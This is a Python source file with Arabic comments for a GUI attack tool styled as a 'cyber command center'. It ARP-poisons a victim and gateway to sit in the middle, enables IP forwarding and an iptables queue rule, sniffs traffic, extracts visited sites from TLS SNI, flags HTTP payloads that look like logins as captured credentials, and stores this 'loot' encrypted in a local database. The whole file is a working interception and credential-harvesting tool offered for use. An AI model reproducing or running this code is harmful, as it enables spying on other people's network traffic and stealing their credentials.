import sys, os, threading, time, sqlite3, re, hashlib, base64, socket, struct, subprocess
from datetime import datetime

# التبعات الأساسية - Critical Dependencies
try:
    from PyQt6.QtWidgets import *
    from PyQt6.QtCore import *
    from PyQt6.QtGui import *
    from scapy.all import *
    from netfilterqueue import NetfilterQueue
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    from reportlab.pdfgen import canvas
except ImportError as e:
    print(f"[!] خطأ في المكتبات: {e}\nيرجى تثبيت المتطلبات: pip install PyQt6 scapy pycryptodome netfilterqueue reportlab")
    sys.exit()

# ==============================================================================
# الطبقة 1: النواة والأمن (THE CORE & SECURITY LAYER)
# ==============================================================================
class JosephVault:
    """إدارة التشفير وقاعدة البيانات المركزية"""
    def __init__(self, master_key="JOSEPH_FAHMY_2026"):
        self.key = hashlib.sha256(master_key.encode()).digest()
        self.db_path = "joseph_ai_vault.db"
        self._bootstrap()

    def _bootstrap(self):
        conn = sqlite3.connect(self.db_path)
        conn.execute("CREATE TABLE IF NOT EXISTS loot (id INTEGER PRIMARY KEY, target TEXT, data BLOB, ts TIMESTAMP)")
        conn.commit()
        conn.close()

    def secure_store(self, target_ip, raw_content):
        cipher = AES.new(self.key, AES.MODE_CBC)
        iv = cipher.iv
        encrypted = cipher.encrypt(pad(raw_content.encode(), AES.block_size))
        final_blob = base64.b64encode(iv + encrypted).decode()
        
        conn = sqlite3.connect(self.db_path)
        conn.execute("INSERT INTO loot (target, data, ts) VALUES (?, ?, ?)", (target_ip, final_blob, datetime.now()))
        conn.commit()
        conn.close()

# ==============================================================================
# الطبقة 2: تفكيك البروتوكولات الثنائية (BINARY DISSECTION LAYER)
# ==============================================================================
class BinaryOracle:
    """استخراج البيانات من قلب الحزم المشفرة (Handshake Analysis)"""
    @staticmethod
    def extract_sni(payload):
        try:
            # التحقق من أن الحزمة هي TLS Client Hello
            if payload[0] == 0x16 and payload[5] == 0x01:
                session_id_len = payload[43]
                pos = 44 + session_id_len
                cipher_suites_len = struct.unpack('!H', payload[pos:pos+2])[0]
                pos += 2 + cipher_suites_len
                compression_len = payload[pos]
                pos += 1 + compression_len
                
                # البحث عن الـ SNI Extension (Type 0x00)
                ext_len = struct.unpack('!H', payload[pos:pos+2])[0]
                pos += 2
                limit = pos + ext_len
                while pos < limit:
                    etype, elen = struct.unpack('!HH', payload[pos:pos+4])
                    if etype == 0x00: # SNI Extension Found
                        name_len = struct.unpack('!H', payload[pos+7:pos+9])[0]
                        return payload[pos+9:pos+9+name_len].decode()
                    pos += 4 + elen
        except: return None
        return None

# ==============================================================================
# الطبقة 3: محرك الهجوم وحقن الكيرنل (ATTACK & KERNEL ENGINE)
# ==============================================================================
class NetworkStriker:
    """إدارة التسميم والتحكم في توجيه الحزم بالنظام"""
    def __init__(self, interface, gateway, signals):
        self.iface = interface
        self.gateway = gateway
        self.signals = signals
        self.running = False

    def engage_mitm(self, target):
        t_mac = getmacbyip(target)
        g_mac = getmacbyip(self.gateway)
        if not t_mac or not g_mac:
            self.signals.log_msg.emit(f"[-] فشل في تحديد MAC Address لـ {target}")
            return
            
        self.running = True
        self.signals.log_msg.emit(f"[*] تم تفعيل بروتوكول التسميم على {target}")
        
        while self.running:
            send(ARP(op=2, pdst=target, hwdst=t_mac, psrc=self.gateway), verbose=False)
            send(ARP(op=2, pdst=self.gateway, hwdst=g_mac, psrc=target), verbose=False)
            time.sleep(2)

# ==============================================================================
# الطبقة 4: واجهة التحكم الرسومية (COMMAND & CONTROL UI)
# ==============================================================================
class MasterSignals(QObject):
    traffic_data = pyqtSignal(str, str, str)
    loot_found = pyqtSignal(str, str)
    log_msg = pyqtSignal(str)

class JosephFahmyUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.vault = JosephVault()
        self.signals = MasterSignals()
        self.init_ui()
        self.signals.traffic_data.connect(self._update_table)
        self.signals.loot_found.connect(self._update_loot)
        self.signals.log_msg.connect(self._update_system_log)

    def init_ui(self):
        self.setWindowTitle("JOSEPH FAHMY AI - CYBER COMMAND CENTER v7.0")
        self.resize(1400, 900)
        self.setStyleSheet("background-color: #080808; color: #00FF41; font-family: 'Consolas';")
        
        main_layout = QVBoxLayout()
        self.tabs = QTabWidget()
        
        # --- تبويب الشبكة ---
        net_tab = QWidget()
        net_lyt = QVBoxLayout(net_tab)
        
        inputs = QHBoxLayout()
        self.target_ip = QLineEdit(); self.target_ip.setPlaceholderText("VICTIM IP")
        self.gate_ip = QLineEdit(); self.gate_ip.setPlaceholderText("GATEWAY IP")
        launch_btn = QPushButton("ENGAGE SYSTEM"); launch_btn.clicked.connect(self.execute)
        inputs.addWidget(self.target_ip); inputs.addWidget(self.gate_ip); inputs.addWidget(launch_btn)
        
        self.table = QTableWidget(0, 3)
        self.table.setHorizontalHeaderLabels(["SOURCE IP", "PROTOCOL", "INFO"])
        self.table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        
        net_lyt.addLayout(inputs); net_lyt.addWidget(self.table)
        
        # --- تبويب السجلات والتقارير ---
        log_tab = QWidget()
        log_lyt = QVBoxLayout(log_tab)
        self.system_logs = QTextEdit(); self.system_logs.setReadOnly(True)
        self.loot_display = QTextEdit(); self.loot_display.setReadOnly(True)
        self.loot_display.setStyleSheet("color: #FFD700;") # Gold for loot
        
        log_lyt.addWidget(QLabel("SYSTEM LOGS:")); log_lyt.addWidget(self.system_logs)
        log_lyt.addWidget(QLabel("CAPTURED ASSETS:")); log_lyt.addWidget(self.loot_display)
        
        self.tabs.addTab(net_tab, "NETWORK COMMAND"); self.tabs.addTab(log_tab, "VAULT & LOGS")
        main_layout.addWidget(self.tabs)
        
        container = QWidget(); container.setLayout(main_layout); self.setCentralWidget(container)

    def _update_table(self, s, p, i):
        row = self.table.rowCount()
        self.table.insertRow(row)
        for idx, val in enumerate([s, p, i]): self.table.setItem(row, idx, QTableWidgetItem(val))
        if row > 200: self.table.removeRow(0)

    def _update_loot(self, target, info):
        self.loot_display.append(f"<b>[!] LOOT FROM {target}:</b> {info}")
        self.vault.secure_store(target, info)

    def _update_system_log(self, msg):
        self.system_logs.append(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")

    def execute(self):
        target, gateway = self.target_ip.text(), self.gate_ip.text()
        if not target or not gateway: return
        
        # إعدادات الكيرنل برمجياً
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)
        os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
        
        # تشغيل المحركات
        self.striker = NetworkStriker("eth0", gateway, self.signals)
        threading.Thread(target=self.striker.engage_mitm, args=(target,), daemon=True).start()
        
        def sniffer_loop():
            sniff(iface="eth0", prn=self.packet_callback, store=0)
        threading.Thread(target=sniffer_loop, daemon=True).start()

    def packet_callback(self, pkt):
        if pkt.haslayer(IP):
            src = pkt[IP].src
            # فك تشفير TLS SNI يدوياً
            if pkt.haslayer(TCP) and pkt[TCP].dport == 443 and pkt.haslayer(Raw):
                domain = BinaryOracle.extract_sni(pkt[Raw].load)
                if domain: self.signals.loot_found.emit(src, f"Visited Site: {domain}")
            
            # تحليل كلمات المرور في HTTP Plaintext
            if pkt.haslayer(Raw):
                load = pkt[Raw].load.decode(errors='ignore')
                if any(x in load.lower() for x in ["user", "pass", "login"]):
                    self.signals.loot_found.emit(src, "Potential Credentials Captured")
            
            self.signals.traffic_data.emit(src, "IP/TCP", f"Len: {len(pkt)}")

# ==============================================================================
# الطبقة 5: نقطة الانطلاق (THE ENTRY POINT)
# ==============================================================================
if __name__ == "__main__":
    if os.getuid() != 0:
        print("!! يجب تشغيل الكود بصلاحيات ROOT (SUDO) للوصول للشبكة !!")
        sys.exit()
        
    app = QApplication(sys.argv)
    app.setStyle("Fusion")
    window = JosephFahmyUI()
    window.show()
    sys.exit(app.exec())
